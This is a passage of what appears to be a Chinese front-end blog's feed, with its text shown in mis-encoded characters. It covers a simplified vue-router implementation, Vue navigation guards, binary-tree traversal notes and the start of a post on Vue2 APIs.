class="literal">undefined</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åº”ç”¨é‡Œçš„æ¯ä¸ªVueå®ä¾‹éƒ½ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°</span></span><br><span class="line">  Vue.mixin(&#123;</span><br><span class="line">    beforeCreate() &#123;</span><br><span class="line">      <span class="comment">// åˆ¤æ–­æ˜¯å¦æ˜¯æ ¹ç»„ä»¶ï¼Œåªæœ‰æ ¹ç»„ä»¶ä¸Šæœ‰routerå¯¹è±¡</span></span><br><span class="line">      <span class="keyword">if</span> (isDef(<span class="keyword">this</span>.$options.router)) &#123;</span><br><span class="line">        <span class="comment">// æ ¹ç»„ä»¶è·¯ç”±</span></span><br><span class="line">        <span class="keyword">this</span>._routerRoot = <span class="keyword">this</span></span><br><span class="line">        <span class="keyword">this</span>._router = <span class="keyword">this</span>.$options.router</span><br><span class="line">        <span class="keyword">this</span>._router.init(<span class="keyword">this</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸º_routeå±æ€§å®ç°åŒå‘ç»‘å®šï¼Œè§¦å‘ç»„ä»¶æ¸²æŸ“</span></span><br><span class="line">        Vue.util.defineReactive(<span class="keyword">this</span>, <span class="string">'_route'</span>, <span class="keyword">this</span>._router.history.current)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å­ç»„ä»¶è·¯ç”±</span></span><br><span class="line">        <span class="keyword">this</span>._routerRoot = (<span class="keyword">this</span>.$parent &amp;&amp; <span class="keyword">this</span>.$parent._routerRoot) || <span class="keyword">this</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è®¾ç½®å…¨å±€è®¿é—®å˜é‡</span></span><br><span class="line">  <span class="comment">// _routerRoot æŒ‡å‘Vueå®ä¾‹</span></span><br><span class="line">  <span class="comment">// _router æŒ‡å‘VueRouterå®ä¾‹</span></span><br><span class="line">  <span class="comment">// $router å½“å‰Routerå®ä¾‹</span></span><br><span class="line">  <span class="comment">// $route å½“å‰Routeä¿¡æ¯</span></span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$router'</span>, &#123;</span><br><span class="line">    get() &#123; <span class="keyword">return</span> <span class="keyword">this</span>._routerRoot._router &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$route'</span>, &#123;</span><br><span class="line">    get() &#123; <span class="keyword">return</span> <span class="keyword">this</span>._routerRoot._route &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®šä¹‰å…¨å±€ç»„ä»¶router-link, router-view</span></span><br><span class="line">  Vue.component(<span class="string">'RouterLink'</span>, Link)</span><br><span class="line">  Vue.component(<span class="string">'RouterView'</span>, View)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> strats = Vue.config.optionMergeStrategies</span><br><span class="line">  strats.beforeRouteEnter = strats.beforeRouteLeave = strats.beforeRouteUpdate = strats.created</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-4-HTML5-Historyæ¨¡å¼"><a href="#3-4-HTML5-Historyæ¨¡å¼" class="headerlink" title="3.4 HTML5 Historyæ¨¡å¼"></a>3.4 HTML5 Historyæ¨¡å¼</h4><p>è¿˜æœ‰hashæ¨¡å¼ã€<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; START &#125; <span class="keyword">from</span> <span class="string">'../util/route'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">HTML5History</span></span>&#123;</span><br><span class="line"><span class="keyword">constructor</span>(router) &#123;</span><br><span class="line"><span class="keyword">this</span>.router = router</span><br><span class="line"><span class="keyword">this</span>.current = START</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'popstate'</span>, e =&gt; &#123;</span><br><span class="line"><span class="keyword">this</span>.transitionTo(<span class="keyword">this</span>.getCurrentLocation())</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹this.currentå€¼</span></span><br><span class="line">transitionTo (location) &#123;</span><br><span class="line"><span class="comment">// ä¿®æ”¹currentçš„å€¼</span></span><br><span class="line"><span class="keyword">const</span> route = <span class="keyword">this</span>.router.match(location, <span class="keyword">this</span>.current)</span><br><span class="line"><span class="keyword">this</span>.current = route</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹æ‰€æœ‰appä¸‹çš„_routeå€¼ï¼Œè§¦å‘RouterViewé‡æ–°æ¸²æŸ“</span></span><br><span class="line"><span class="keyword">this</span>.cb &amp;&amp; <span class="keyword">this</span>.cb(route)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getCurrentLocation() &#123;</span><br><span class="line"><span class="keyword">let</span> path = <span class="built_in">decodeURI</span>(<span class="built_in">window</span>.location.pathname)</span><br><span class="line"><span class="keyword">return</span> (path || <span class="string">'/'</span>) + <span class="built_in">window</span>.location.search + <span class="built_in">window</span>.location.hash</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push(location) &#123;</span><br><span class="line"><span class="comment">// pushstate</span></span><br><span class="line"><span class="keyword">this</span>.transitionTo(location)</span><br><span class="line"><span class="built_in">window</span>.history.pushState(<span class="literal">null</span>, <span class="string">''</span>, location.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  replace(location) &#123;</span><br><span class="line"><span class="comment">// replacesstate</span></span><br><span class="line"><span class="keyword">this</span>.transitionTo(location)</span><br><span class="line"><span class="keyword">const</span> stateCopy = <span class="built_in">Object</span>.assign(&#123;&#125;, history.state)</span><br><span class="line"><span class="built_in">window</span>.history.replaceState(stateCopy, <span class="string">''</span>, location.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  go(n) &#123;</span><br><span class="line"><span class="built_in">window</span>.history.go(n)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="3-8-Router-Viewç»„ä»¶"><a href="#3-8-Router-Viewç»„ä»¶" class="headerlink" title="3.8 Router-Viewç»„ä»¶"></a>3.8 Router-Viewç»„ä»¶</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'RouterView'</span>,</span><br><span class="line">  functional: <span class="literal">true</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">      type: <span class="built_in">String</span>,</span><br><span class="line">      <span class="keyword">default</span>: <span class="string">'default'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  render(_, &#123; props, children, parent, data &#125;) &#123;</span><br><span class="line">    <span class="keyword">const</span> h = parent.$createElement</span><br><span class="line">    <span class="keyword">const</span> route = parent.$route</span><br><span class="line"></span><br><span class="line">    <span class="comment">// render empty node if no matched route or no config component</span></span><br><span class="line">    <span class="keyword">if</span> (!parent.$route) &#123;</span><br><span class="line">      <span class="keyword">return</span> h()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–è·¯ç”±å¯¹åº”ç»„ä»¶</span></span><br><span class="line">    <span class="keyword">const</span> matched = route.matched[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">const</span> component = matched &amp;&amp; matched.components.default</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h(component, data, children)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-9-Router-Linkç»„ä»¶"><a href="#3-9-Router-Linkç»„ä»¶" class="headerlink" title="3.9 Router-Linkç»„ä»¶"></a>3.9 Router-Linkç»„ä»¶</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'RouterLink'</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    to: &#123;</span><br><span class="line">      type: <span class="built_in">String</span>,</span><br><span class="line">      required: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  render(h) &#123;</span><br><span class="line">    <span class="keyword">const</span> router = <span class="keyword">this</span>.$router</span><br><span class="line">    <span class="keyword">const</span> current = <span class="keyword">this</span>.$route</span><br><span class="line">    <span class="keyword">const</span> &#123; location, route, href &#125; = router.resolve(<span class="keyword">this</span>.to, current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> href = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      router.push(&#123; <span class="attr">path</span>: href &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;a on-click=&#123;href&#125;&gt;&#123;<span class="keyword">this</span>.$slots.default&#125;&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-é’©å­å‡½æ•°"><a href="#4-é’©å­å‡½æ•°" class="headerlink" title="4. é’©å­å‡½æ•°"></a>4. é’©å­å‡½æ•°</h3><h4 id="4-1-å…¨å±€å®ˆå«"><a href="#4-1-å…¨å±€å®ˆå«" class="headerlink" title="4.1 å…¨å±€å®ˆå«"></a>4.1 å…¨å±€å®ˆå«</h4><ul><li><code>router.beforeEach(to, from, next)</code>è¿›å…¥è·¯ç”±å‰</li><li><code>router.beforeResolve(to, from, next)</code></li><li><code>router.afterEach(to, from)</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123; ... &#125;)</span><br><span class="line"></span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-2-è·¯ç”±ç‹¬äº«å®ˆå«"><a href="#4-2-è·¯ç”±ç‹¬äº«å®ˆå«" class="headerlink" title="4.2 è·¯ç”±ç‹¬äº«å®ˆå«"></a>4.2 è·¯ç”±ç‹¬äº«å®ˆå«</h4><ul><li><code>beforeRouteEnter</code>è¿›å…¥è·¯ç”±å‰</li><li><code>beforeRouteUpdate</code>è·¯ç”±å¤ç”¨åŒä¸€ä¸ªç»„ä»¶æ—¶</li><li><code>beforeRouteLeave</code>ç¦»å¼€è·¯ç”±æ—¶<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">'/foo'</span>,</span><br><span class="line">      component: Foo,</span><br><span class="line">      beforeRouteEnter (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">        <span class="comment">// ä¸èƒ½è·å–ç»„ä»¶å®ä¾‹ `this`ï¼Œç»„ä»¶å®ä¾‹è¿˜æ²¡è¢«åˆ›å»º</span></span><br><span class="line">      &#125;,</span><br><span class="line">      beforeRouteUpdate (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">        <span class="comment">// åœ¨å½“å‰è·¯ç”±æ”¹å˜ï¼Œä½†æ˜¯è¯¥ç»„ä»¶è¢«å¤ç”¨æ—¶è°ƒç”¨ å¯ä»¥è®¿é—®ç»„ä»¶å®ä¾‹ `this`</span></span><br><span class="line">        <span class="comment">// ä¸¾ä¾‹æ¥è¯´ï¼Œå¯¹äºä¸€ä¸ªå¸¦æœ‰åŠ¨æ€å‚æ•°çš„è·¯å¾„ /foo/:idï¼Œåœ¨ /foo/1 å’Œ /foo/2 ä¹‹é—´è·³è½¬çš„æ—¶å€™ï¼Œ</span></span><br><span class="line">        <span class="comment">// ç”±äºä¼šæ¸²æŸ“åŒæ ·çš„ Foo ç»„ä»¶ï¼Œå› æ­¤ç»„ä»¶å®ä¾‹ä¼šè¢«å¤ç”¨ã€‚è€Œè¿™ä¸ªé’©å­å°±ä¼šåœ¨è¿™ä¸ªæƒ…å†µä¸‹è¢«è°ƒç”¨ã€‚</span></span><br><span class="line">      &#125;,</span><br><span class="line">      beforeRouteLeave (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">        <span class="comment">// å¯¼èˆªç¦»å¼€è¯¥ç»„ä»¶çš„å¯¹åº”è·¯ç”±æ—¶è°ƒç”¨ï¼Œå¯ä»¥è®¿é—®ç»„ä»¶å®ä¾‹ `this`</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-3-ç»„ä»¶çº§å®ˆå«"><a href="#4-3-ç»„ä»¶çº§å®ˆå«" class="headerlink" title="4.3 ç»„ä»¶çº§å®ˆå«"></a>4.3 ç»„ä»¶çº§å®ˆå«</h4><p>å‚æ•°æˆ–æŸ¥è¯¢çš„æ”¹å˜å¹¶ä¸ä¼šè§¦å‘è¿›å…¥/ç¦»å¼€çš„å¯¼èˆªå®ˆå«ã€‚ä½ </p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5b35dcb5f265da59a117344d" target="_blank" rel="noopener">vue-router æºç ï¼šå®ç°ä¸€ä¸ªç®€å•çš„ vue-router</a></li><li><a href="https://juejin.im/post/58b6bb8044d904006ac40c78" target="_blank" rel="noopener">ã€Œå‰ç«¯ã€History APIä¸æµè§ˆå™¨å†å²å †æ ˆç®¡ç†</a></li><li><a href="https://juejin.im/post/5b5697675188251b11097464" target="_blank" rel="noopener">VueRouter æºç æ·±åº¦è§£æ</a></li><li><a href="https://juejin.cn/post/6844903641866829838" target="_blank" rel="noopener">Vueçš„é’©å­å‡½æ•°[è·¯ç”±å¯¼èˆªå®ˆå«ã€keep-aliveã€ç”Ÿå‘½å‘¨æœŸé’©å­]</a></li><li><a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html" target="_blank" rel="noopener">Vue-Routeræ–‡æ¡£</a></li><li><a href="https://juejin.cn/post/6844904064367460366" target="_blank" rel="noopener">å¸¦ä½ å…¨é¢åˆ†ævue-routeræºç </a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ ‘ã€äºŒå‰æ ‘ã€äºŒå‰æœç´¢æ ‘</title>
      <link href="/2019/10/19/Leetcode-%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
      <url>/2019/10/19/Leetcode-%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
      <content type="html"><![CDATA[<h3 id="1-æ•°æ®ç»“æ„"><a href="#1-æ•°æ®ç»“æ„" class="headerlink" title="1. æ•°æ®ç»“æ„"></a>1. æ•°æ®ç»“æ„</h3><ul><li>æ ‘: parentNode, childrenNode</li><li>äºŒå‰æ ‘ï¼šå„¿å­èŠ‚ç‚¹åªæœ‰ä¸¤ä¸ª - å·¦èŠ‚ç‚¹ã€å³èŠ‚ç‚¹</li><li>äºŒå‰æœç´¢æ ‘ï¼šå·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹èŠ‚ç‚¹çš„å€¼ï¼›å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºå®ƒçš„æ ¹èŠ‚ç‚¹çš„å€¼ã€‚æŸ¥è¯¢å’Œæ“ä½œéƒ½æ˜¯<code>O(logn)</code></li></ul><p>èŠ‚ç‚¹å®šä¹‰<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span> (<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.val = val</span><br><span class="line">  <span class="keyword">this</span>.left = <span class="literal">null</span></span><br><span class="line">  <span class="keyword">this</span>.right = <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2-æ ‘çš„éå†"><a href="#2-æ ‘çš„éå†" class="headerlink" title="2. æ ‘çš„éå†"></a>2. æ ‘çš„éå†</h3><p>æ ‘çš„è§£æ³•ä¸€èˆ¬éƒ½æ˜¯é€’å½’</p><h4 id="2-1-å‰åºéå†"><a href="#2-1-å‰åºéå†" class="headerlink" title="2.1 å‰åºéå†"></a>2.1 å‰åºéå†</h4><p>å…ˆè®¿é—®å½“å‰èŠ‚ç‚¹ï¼Œç„¶åå·¦èŠ‚ç‚¹ï¼Œå³èŠ‚ç‚¹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> preorder = <span class="function"><span class="params">node</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span></span><br><span class="line">  path.push(node.val)</span><br><span class="line">  preorder(node.left)</span><br><span class="line">  preorder(node.right)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="2-2-ä¸­åºéå†"><a href="#2-2-ä¸­åºéå†" class="headerlink" title="2.2 ä¸­åºéå†"></a>2.2 ä¸­åºéå†</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> inorder = <span class="function"><span class="params">node</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span></span><br><span class="line">  inorder(node.left)</span><br><span class="line">  path.push(node.val)</span><br><span class="line">  inorder(node.right)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-ååºéå†"><a href="#2-3-ååºéå†" class="headerlink" title="2.3 ååºéå†"></a>2.3 ååºéå†</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> backorder = <span class="function"><span class="params">node</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span></span><br><span class="line">  backorder(node.left)</span><br><span class="line">  backorder(node.right)</span><br><span class="line">  path.push(node.val)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-LeetCode"><a href="#3-LeetCode" class="headerlink" title="3. LeetCode"></a>3. LeetCode</h3><h4 id="çˆ¬æ¥¼æ¢¯"><a href="#çˆ¬æ¥¼æ¢¯" class="headerlink" title="çˆ¬æ¥¼æ¢¯"></a>çˆ¬æ¥¼æ¢¯</h4><h4 id="æ‹¬å·ç”Ÿæˆç­‰é—®é¢˜"><a href="#æ‹¬å·ç”Ÿæˆç­‰é—®é¢˜" class="headerlink" title="æ‹¬å·ç”Ÿæˆç­‰é—®é¢˜"></a>æ‹¬å·ç”Ÿæˆç­‰é—®é¢˜</h4>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue2 çš„ API æ˜¯çœŸçš„å¥½ç”¨ï¼</title>
      <link href="/2019/10/11/Vue%20API/"/>
      <url>/2019/10/11/Vue%20API/</url>
      <content type="html"><![CDATA[<h3 id="1-Data"><a href="#1-Data" class="headerlink" title="1. Data"></a>1. Data</h3><p><em>Data ä¸ºä»€ä¹ˆæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œä¸æ˜¯å¯¹è±¡ï¼Ÿ</em><br>ä¸ºäº†æ–¹ä¾¿åˆå§‹åŒ–dataï¼Œç›´æ¥<em><code>this.data = vm.$options.data()</code></em>å°±å¯ä»¥æ‹¿åˆ°ä¸€ä»½æ–°çš„dataï¼Œä¸ç”¨æ·±æ‹·è´ä¸€ä¸ª dataï¼Œæ–¹ä¾¿å®‰å…¨ã€‚é¿å…å¤šä¸ªç»„ä»¶å®ä¾‹å¯¹è±¡ä¹‹é—´å…¬ç”¨ä¸€ä¸ª<code>data</code>,äº§ç”Ÿæ•°æ®æ±¡æŸ“ã€‚</p><p><br></p><h3 id="2-NextTick"><a href="#2-NextTick" class="headerlink" title="2. NextTick"></a>2. NextTick</h3><p>æ•°æ®åœ¨å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œ<code>vue</code>ä¸ä¼šç«‹åˆ»å»æ›´æ–°<code>DOM</code>ï¼Œè€Œæ˜¯å°†ä¿®æ”¹æ•°æ®çš„æ“ä½œæ”¾åœ¨ä¸€ä¸ªæ“ä½œé˜Ÿåˆ—ä¸­ã€‚å¦‚æœæˆ‘ä»¬ä¸€ç›´ä¿®æ”¹ä¸€ä¸ªæ•°æ®ï¼Œå¼‚æ­¥æ“ä½œé˜Ÿåˆ—è¿˜ä¼šè¿›è¡Œå»é‡ï¼Œç­‰åŒä¸€äº‹ä»¶å¾ªç¯ä¸­çš„æ‰€æœ‰æ•°æ®å˜åŒ–å®Œæˆåï¼Œæ‰ä¼šè¿›è¡Œ<code>DOM</code>çš„æ›´æ–°ã€‚</p><p><em>NextTickåŸç†</em></p><ul><li>æŠŠå›è°ƒå‡½æ•°æ”¾å…¥callbacksç­‰å¾…æ‰§è¡Œ</li><li>å°†å¾…æ‰§è¡Œå‡½æ•°æ”¾åˆ°<code>Promise.then</code>å¾®ä»»åŠ¡æ“ä½œ</li><li>äº‹ä»¶å¾ªç¯åˆ°äº†å¾®ä»»åŠ¡ï¼Œæ‰§è¡Œå‡½æ•°ä¾æ¬¡æ‰§è¡Œcallbacksä¸­çš„å›è°ƒ<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¦‚æœæ²¡æœ‰nextTickæœºåˆ¶ï¼Œnumæ¯æ¬¡æ›´æ–°å€¼éƒ½ä¼šè§¦å‘è§†å›¾æ›´æ–°ã€‚æœ‰äº†nextTickï¼Œåªéœ€æ›´æ–°ä¸€æ¬¡</span></span><br><span class="line">&#123;&#123; num &#125;&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">num = i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-Slot"><a href="#3-Slot" class="headerlink" title="3. Slot"></a>3. Slot</h3><p><code>Slot</code>æ’æ§½ï¼Œåˆåâ€œå å‘â€ï¼Œå¯ä»¥ç†è§£ä¸ºåœ¨ç»„ä»¶ä¸­å å¥½äº†ä½ç½®ï¼Œå…è®¸ä½ è‡ªåŠ¨å¾€é‡Œé¢å¡«å‘ã€‚<br>é€šè¿‡<code>slot</code>æ’æ§½å‘ç»„ä»¶ä¼ é€’propsï¼Œ<code>slot</code>æ˜¯Vue2 å®ç°é€»è¾‘å¤ç”¨çš„é‡è¦æ–¹å¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Mouse v-slot=<span class="string">"&#123;x, y&#125;"</span>&gt;&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;&lt;<span class="regexp">/Mouse&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-Virtual-Dom"><a href="#4-Virtual-Dom" class="headerlink" title="4. Virtual Dom"></a>4. Virtual Dom</h3><ul><li>æ©ç›–åº•å±‚çš„DOMæ“ä½œ<br>è®©ä½ ç”¨æ›´å£°æ˜å¼çš„æ–¹å¼æ¥æè¿°ä½ çš„ç›®çš„ï¼Œè®©ä½ çš„ä»£ç æ›´å®¹æ˜“ç»´æŠ¤ã€‚å½“ç„¶ï¼Œæ²¡æœ‰ä»»ä½•æ¡†æ¶å¯ä»¥æ¯”çº¯æ‰‹åŠ¨çš„ä¼˜åŒ– DOM æ“ä½œæ›´å¿«ã€‚</li><li>å¯¹æ¸²æŸ“è¿‡ç¨‹çš„æŠ½è±¡<br>ä½¿å¾—æ¡†æ¶å¯ä»¥æ¸²æŸ“åˆ°webä»¥å¤–çš„å¹³å°ï¼Œå¦‚ç§»åŠ¨ç«¯React Nativeã€WebGLã€SSRã€‚</li><li>æ•°æ®é¢‘ç¹å˜æ›´åçš„åˆå¹¶å¤„ç† + Diffï¼šå‡å°‘é‡æ’é‡ç»˜<ol><li>è™šæ‹Ÿ DOM ä¸ä¼šç«‹é©¬è¿›è¡Œæ’ç‰ˆä¸é‡ç»˜æ“ä½œ</li><li>è™šæ‹Ÿ DOM è¿›è¡Œé¢‘ç¹ä¿®æ”¹ï¼Œç„¶åä¸€æ¬¡æ€§æ¯”è¾ƒå¹¶ä¿®æ”¹çœŸå® DOM ä¸­éœ€è¦æ”¹çš„éƒ¨åˆ†ï¼Œæœ€ååœ¨çœŸå® DOM ä¸­è¿›è¡Œæ’ç‰ˆä¸é‡ç»˜ï¼Œå‡å°‘è¿‡å¤šDOMèŠ‚ç‚¹æ’ç‰ˆä¸é‡ç»˜æŸè€—</li><li>è™šæ‹Ÿ DOM æœ‰æ•ˆé™ä½å¤§é¢ç§¯çœŸå® DOM çš„é‡ç»˜ä¸æ’ç‰ˆï¼Œå› ä¸ºæœ€ç»ˆä¸çœŸå® DOM æ¯”è¾ƒå·®å¼‚ï¼Œå¯ä»¥åªæ¸²æŸ“å±€éƒ¨</li></ol></li></ul><p><br></p><h3 id="5-Mixin"><a href="#5-Mixin" class="headerlink" title="5. Mixin"></a>5. Mixin</h3><p><code>Mixin</code>æ˜¯ä¸€ä¸ªjså¯¹è±¡ï¼Œå®ƒå¯ä»¥åŒ…å«ç»„ä»¶ä¸­ä»»æ„åŠŸèƒ½é€‰é¡¹ï¼Œå¦‚<code>data</code>, <code>components</code>, <code>methods</code>, <code>created</code>, 